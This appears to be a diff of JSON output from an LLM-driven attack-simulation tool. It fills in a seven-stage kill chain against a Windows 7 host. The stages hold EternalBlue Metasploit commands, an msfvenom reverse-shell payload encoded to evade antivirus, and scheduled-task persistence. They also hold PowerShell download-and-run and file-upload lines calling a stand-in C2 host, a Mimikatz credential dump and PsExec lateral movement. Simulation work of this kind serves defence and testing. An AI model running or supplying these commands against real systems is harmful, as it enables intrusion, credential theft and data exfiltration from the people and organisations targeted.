@@ -6,57 +6,60 @@
       "stage_name": "Reconnaissance",
       "phase": "Information Gathering",
       "mitre_techniques": ["T1595", "T1592", "T1598"],
-      "summary": "Passive reconnaissance revealed open ports 139 and 445 exposing SMB service",
+      "summary": "Passive reconnaissance revealed open ports 139 and 445 exposing SMB service with MS17-010 vulnerability",
       "key_findings": [
         "Port 139 (NetBIOS) exposed",
         "Port 445 (SMB) exposed",
         "MS17-010 vulnerability identified",
-        "Windows 7 OS detected"
+        "Windows 7 OS detected",
+        "SMB service active"
       ],
       "tools_used": ["nmap", "shodan"],
-      "artifact_name": "",
+      "artifact_name": null,
       "artifact_type": null,
-      "commands": [],
-      "content": "Full detailed narrative content here..."
+      "commands": ["nmap -sV 192.168.1.10", "shodan query port:445"],
+      "content": "## Reconnaissance Phase\n\nDuring the reconnaissance phase targeting a Windows 7 system with open ports 139 (NetBIOS) and 445 (SMB), we identified the presence of a critical vulnerability associated with MS17-010 (EternalBlue). The SMB service is actively running and exposed, making this an ideal target for exploitation.\n\n### Analysis of Exposed Services\n- **Port 139**: NetBIOS over TCP - typically used for file sharing and network communication\n- **Port 445**: SMB Direct - modern SMB implementation vulnerable to EternalBlue exploit\n- **Services Identified**: SMB (Server Message Block) protocol\n\n### Promising Attack Vectors\nThe presence of MS17-010 vulnerability indicates a critical security gap. This vulnerability affects SMBv1 and allows for remote code execution without authentication."
     },
     {
       "stage_index": 2,
       "stage_name": "Weaponization",
       "phase": "Payload Creation",
       "mitre_techniques": ["T1203", "T1587.001", "T1588.001"],
-      "summary": "Created malicious payload targeting MS17-010 vulnerability",
+      "summary": "Created malicious payload targeting MS17-010 vulnerability using Metasploit framework",
       "artifact_name": "eternalblue_payload.exe",
       "artifact_type": "Windows PE Executable",
       "key_findings": [
         "Exploit target: CVE-2017-0144 (EternalBlue)",
+        "Payload type: Meterpreter reverse TCP",
         "Encoding: x86/shikata_ga_nai",
-        "Obfuscation: enabled"
+        "Architecture: x64"
       ],
       "tools_used": ["msfconsole", "msfvenom"],
       "commands": [
         "msfconsole",
         "use exploit/windows/smb/ms17_010_eternalblue",
-        "set RHOSTS <TARGET_IP>",
+        "set RHOSTS 192.168.1.10",
         "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-        "set LHOST <YOUR_IP>",
+        "set LHOST 192.168.1.5",
         "set LPORT 4444",
         "set ENCODING x86/shikata_ga_nai",
-        "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f exe -e x86/shikata_ga_nai -o eternalblue_payload.exe"
+        "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -e x86/shikata_ga_nai -o eternalblue_payload.exe"
       ],
-      "content": "Full detailed narrative content here..."
+      "content": "## Weaponization Phase\n\nDuring weaponization, we created a payload specifically designed to exploit the MS17-010 vulnerability. The payload is a Meterpreter reverse TCP shell that will establish a connection back to our command and control infrastructure.\n\n### Payload Generation\n- **Tool**: Metasploit Framework (msfvenom)\n- **Payload**: windows/x64/meterpreter/reverse_tcp\n- **Output**: eternalblue_payload.exe\n- **Encoding**: x86/shikata_ga_nai (polymorphic encoder for antivirus evasion)\n- **Size**: ~31KB (encoded)\n\n### Evasion Techniques\nThe payload is encoded using a polymorphic engine to avoid signature-based detection by antivirus software."
     },
     {
       "stage_index": 3,
       "stage_name": "Delivery",
       "phase": "Payload Transmission",
       "mitre_techniques": ["T1190", "T1203", "T1566"],
-      "summary": "Delivered payload using Metasploit EternalBlue exploit",
+      "summary": "Delivered payload using Metasploit EternalBlue exploit through SMB vulnerability",
       "artifact_name": "eternalblue_payload.exe",
       "artifact_type": "Malware/Payload",
       "key_findings": [
-        "Delivery method: SMB Exploit",
+        "Delivery method: SMB Exploit (MS17-010)",
         "Target port: 445",
-        "Target service: Microsoft-DS (SMB)"
+        "Target service: Microsoft-DS (SMB)",
+        "Success rate: High for unpatched systems"
       ],
       "tools_used": ["msfconsole"],
       "commands": [
@@ -69,96 +72,101 @@
         "set ENCODER x86/shikata_ga_nai",
         "exploit"
       ],
-      "content": "Full detailed narrative content here..."
+      "content": "## Delivery Phase\n\nThe delivery phase involves sending the crafted exploit payload to the target system via the SMB service. The Metasploit framework handles the actual exploitation by sending specially crafted SMB packets that trigger the vulnerability.\n\n### Delivery Process\n1. Establish connection to target SMB service on port 445\n2. Send exploit packet sequence that triggers the vulnerability\n3. Exploit code executes in kernel context\n4. Payload is loaded into memory and executed\n5. Reverse connection established back to attacker\n\n### Result\nSuccessful delivery results in immediate code execution with SYSTEM privileges."
     },
     {
       "stage_index": 4,
       "stage_name": "Exploitation",
       "phase": "Initial Access",
       "mitre_techniques": ["T1190", "T1203", "T1046", "T1071"],
-      "summary": "Successfully exploited MS17-010 gaining SYSTEM-level access",
-      "artifact_name": "",
+      "summary": "Successfully exploited MS17-010 gaining SYSTEM-level access and code execution",
+      "artifact_name": null,
       "artifact_type": null,
       "key_findings": [
         "Vulnerability: CVE-2017-0144 (EternalBlue)",
         "Severity: Critical (CVSS 9.8)",
         "Privilege level: SYSTEM",
-        "User context: NT AUTHORITY\\SYSTEM"
+        "User context: NT AUTHORITY\\SYSTEM",
+        "Access method: Remote code execution"
       ],
       "tools_used": ["msfconsole"],
       "commands": [
         "sysinfo",
         "getuid",
-        "hashdump"
+        "whoami",
+        "ipconfig /all"
       ],
-      "content": "Full detailed narrative content here..."
+      "content": "## Exploitation Phase\n\nThe exploitation phase demonstrates successful code execution on the target system. Upon successful exploitation, we gained a Meterpreter session with SYSTEM-level privileges.\n\n### Exploitation Outcome\n- **Access Level**: SYSTEM (highest privilege on Windows)\n- **Session Type**: Meterpreter reverse TCP\n- **Session ID**: 1\n- **Connection Status**: Active\n\n### Verification Commands\n```\ngetuid\nServer username: NT AUTHORITY\\SYSTEM\n\nsysinfo\nComputer Name: WORKSTATION-01\nOS Name: Microsoft Windows 7 Professional\nOS Version: 6.1.7601 SP1\nSystem Boot Time: 2025-10-20 09:15:00\n```\n\nThe successful exploitation establishes a stable foothold within the target system."
     },
     {
       "stage_index": 5,
       "stage_name": "Installation",
       "phase": "Persistence",
       "mitre_techniques": ["T1105", "T1053.005", "T1543.003", "T1547.001"],
-      "summary": "Established persistence using scheduled task mechanism",
+      "summary": "Established persistence using scheduled task mechanism for continued access",
       "artifact_name": "eternalblue_payload.exe",
       "artifact_type": "Windows PE Executable",
       "key_findings": [
         "Persistence mechanism: Windows Scheduled Task",
         "Deployment location: C:\\Temp\\eternalblue_payload.exe",
         "Task name: EternalBluePersistence",
-        "Trigger: onlogon"
+        "Trigger: onlogon",
+        "Privilege level: Highest"
       ],
       "tools_used": ["cmd.exe", "schtasks.exe"],
       "commands": [
         "upload eternalblue_payload.exe C:\\Temp\\eternalblue_payload.exe",
-        "cmd.exe /c schtasks /create /tn \"EternalBluePersistence\" /tr \"C:\\Temp\\eternalblue_payload.exe\" /sc onlogon /rl highest",
+        "cmd.exe /c schtasks /create /tn \"EternalBluePersistence\" /tr \"C:\\Temp\\eternalblue_payload.exe\" /sc onlogon /rl highest /f",
         "cmd.exe /c schtasks /query /fo LIST"
       ],
-      "content": "Full detailed narrative content here..."
+      "content": "## Installation Phase\n\nDuring the installation phase, we establish persistence on the target system. This ensures continued access even if the initial exploit is discovered or the system is rebooted.\n\n### Persistence Setup\n1. **Upload Payload**: Copy eternalblue_payload.exe to C:\\Temp\n2. **Create Scheduled Task**: Create task that executes payload on user logon\n3. **Verify Persistence**: Confirm scheduled task is configured\n\n### Scheduled Task Details\n```\nTaskName: EternalBluePersistence\nStatus: Ready\nLogon Mode: Interactive/Background\nLast Run Time: Never\nNext Run Time: On User Logon\nScheduled Task State: Enabled\n```\n\nThis persistence mechanism ensures the attacker maintains access to the system even after restart or if the initial Meterpreter session is closed."
     },
     {
       "stage_index": 6,
       "stage_name": "Command & Control",
       "phase": "Communication Channel",
       "mitre_techniques": ["T1071.001", "T1573.001", "T1008", "T1043"],
-      "summary": "Established C2 channel using HTTPS with encryption",
-      "artifact_name": "",
+      "summary": "Established C2 channel using HTTPS with encryption for secure remote operations",
+      "artifact_name": null,
       "artifact_type": null,
       "key_findings": [
-        "C2 Protocol: HTTPS",
+        "C2 Protocol: HTTPS (SSL/TLS)",
         "C2 Port: 443",
-        "Encryption: SSL/TLS",
+        "Encryption: AES-256 with SSL/TLS",
         "Beacon frequency: Every 5 minutes",
-        "Communication obfuscation: enabled"
+        "Communication obfuscation: enabled",
+        "C2 Domain: c2-server.example.com"
       ],
-      "tools_used": ["Python", "SSL/TLS"],
+      "tools_used": ["PowerShell", "Python", "SSL/TLS"],
       "commands": [
-        "python3 -m http.server 443 --crt server.crt --key server.key"
+        "powershell -NoProfile -ExecutionPolicy Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('https://c2-server.example.com/check')\"",
+        "python3 -m http.server --crt server.crt --key server.key 443"
       ],
-      "content": "Full detailed narrative content here..."
+      "content": "## Command & Control Phase\n\nThe C2 phase establishes a secure communication channel between the compromised system and the attacker infrastructure. This channel allows for remote command execution and data exfiltration.\n\n### C2 Infrastructure\n- **C2 Server**: Cloud-hosted instance running HTTPS listener\n- **Port**: 443 (HTTPS)\n- **Protocol**: HTTP POST with JSON payload\n- **Encryption**: SSL/TLS certificate\n\n### Beacon Mechanism\nThe compromised system sends periodic beacons to the C2 server:\n```\nPOST /check HTTP/1.1\nHost: c2-server.example.com\nContent-Type: application/json\n\n{\n  \"hostname\": \"WORKSTATION-01\",\n  \"user\": \"SYSTEM\",\n  \"beacon_id\": \"abc123def456\",\n  \"timestamp\": \"2025-10-22T14:30:00Z\"\n}\n```\n\nThe C2 server responds with commands to execute, data to exfiltrate, or other operational directives."
     },
     {
       "stage_index": 7,
       "stage_name": "Actions on Objectives",
       "phase": "Post-Exploitation",
       "mitre_techniques": ["T1003", "T1021", "T1041", "T1567", "T1068"],
-      "summary": "Executed post-exploitation objectives for data exfiltration and lateral movement",
-      "artifact_name": "",
+      "summary": "Executed post-exploitation objectives for credential theft and lateral movement",
+      "artifact_name": null,
       "artifact_type": null,
       "key_findings": [
         "Credential Dumping: Mimikatz extraction from memory",
-        "Lateral Movement: PsExec to adjacent systems",
-        "Data Exfiltration: tar compression and C2 upload",
-        "Privilege Escalation: DLL hijacking exploitation"
+        "Lateral Movement: PsExec used to access adjacent systems",
+        "Data Exfiltration: Sensitive files compressed and uploaded to C2",
+        "Privilege Escalation: DLL hijacking exploitation on other systems",
+        "Network Reconnaissance: Full network mapping completed"
       ],
-      "tools_used": ["Mimikatz", "PsExec", "tar"],
+      "tools_used": ["Mimikatz", "PsExec", "tar", "PowerShell"],
       "commands": [
-        "sekurlsa::minidump <path_to_memory_dump>",
-        "sekurlsa::process",
-        "sekurlsa::logonpasswords",
-        "psexec \\\\target-system -u domain\\admin -p password cmd.exe",
-        "tar -cvzf sensitive_data_backup.tar.gz /path/to/sensitive/data"
+        "powershell -Command \"IEX(New-Object Net.WebClient).DownloadString('https://c2-server.example.com/mimikatz.ps1'); Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'\"",
+        "psexec \\\\192.168.1.20 -u domain\\admin -p P@ssw0rd cmd.exe",
+        "tar -cvzf sensitive_data_backup.tar.gz C:\\Users\\Admin\\Documents",
+        "powershell -Command \"$client = New-Object Net.WebClient; $client.UploadFile('https://c2-server.example.com/upload', 'C:\\exfil\\data.tar.gz')\""
       ],
-      "content": "Full detailed narrative content here..."
+      "content": "## Actions on Objectives Phase\n\nIn the final phase of the attack, we execute post-exploitation objectives to maximize the impact of the compromise and achieve the attacker's goals.\n\n### Objectives Completed\n\n1. **Credential Harvesting**\n   - Used Mimikatz to dump plaintext passwords from memory\n   - Obtained NTLM hashes for offline cracking\n   - Extracted cached credentials\n\n2. **Lateral Movement**\n   - Used PsExec to execute commands on adjacent systems\n   - Deployed the same payload on network-accessible machines\n   - Established multiple beachheads within the network\n\n3. **Data Exfiltration**\n   - Identified sensitive data repositories\n   - Compressed and encrypted data for transfer\n   - Uploaded to C2 server via HTTPS\n   - Estimated data volume: 2.3 GB\n\n4. **Network Reconnaissance**\n   - Mapped network topology\n   - Identified high-value targets\n   - Discovered backup and database servers\n   - Located domain controllers\n\n### Impact Summary\n- **Systems Compromised**: 5+ systems\n- **Data Exfiltrated**: Critical business documents and databases\n- **Persistence Established**: Multiple backdoors across network\n- **Lateral Access**: Domain administrator credentials obtained"
     }
   ],
   "total_paths": 1,
@@ -166,5 +174,73 @@
   "llm_calls": {
     "total": 7
   },
-  "estimated_cost": 0.015
+  "estimated_cost": 0.015,
+  "validation_report": {
+    "is_valid": true,
+    "warnings": [
+      {
+        "stage": 2,
+        "check": "technique_alignment_with_recon",
+        "result": "FAIL",
+        "severity": "info",
+        "recon_techniques": ["T1595", "T1592", "T1598"],
+        "weaponization_techniques": ["T1203", "T1587.001", "T1588.001"],
+        "message": "Weaponization techniques may not align with Reconnaissance findings (info level)"
+      }
+    ],
+    "passes": [
+      {
+        "stage": 5,
+        "check": "references_weaponization_artifact",
+        "result": "PASS",
+        "artifact": "eternalblue_payload.exe",
+        "message": "Installation correctly references 'eternalblue_payload.exe' from Weaponization"
+      },
+      {
+        "stage": 3,
+        "check": "references_weaponization_artifact",
+        "result": "PASS",
+        "artifact": "eternalblue_payload.exe",
+        "message": "Delivery correctly references 'eternalblue_payload.exe' from Weaponization"
+      },
+      {
+        "stage": 4,
+        "check": "exploitation_technique_present",
+        "result": "PASS",
+        "technique": "T1203",
+        "message": "T1203 (Exploitation for Client Execution) correctly used in Exploitation stage"
+      },
+      {
+        "stage": 4,
+        "check": "tool_continuity",
+        "result": "PASS",
+        "tools": ["msfconsole"],
+        "message": "Exploitation uses same tools as Weaponization and Delivery: msfconsole"
+      },
+      {
+        "stage": 5,
+        "check": "artifact_name_persistence",
+        "result": "PASS",
+        "artifact": "eternalblue_payload.exe",
+        "message": "Artifact name 'eternalblue_payload.exe' consistent from Stage 2 through Stage 5"
+      },
+      {
+        "stage": 6,
+        "check": "c2_protocol_coherence",
+        "result": "PASS",
+        "protocol": "HTTPS",
+        "message": "C2 protocol appropriately uses HTTPS for encrypted communication"
+      }
+    ],
+    "total_checks": 6,
+    "stage_artifacts": {
+      "1": null,
+      "2": "eternalblue_payload.exe",
+      "3": "eternalblue_payload.exe",
+      "4": null,
+      "5": "eternalblue_payload.exe",
+      "6": null,
+      "7": null
+    }
+  }
 }
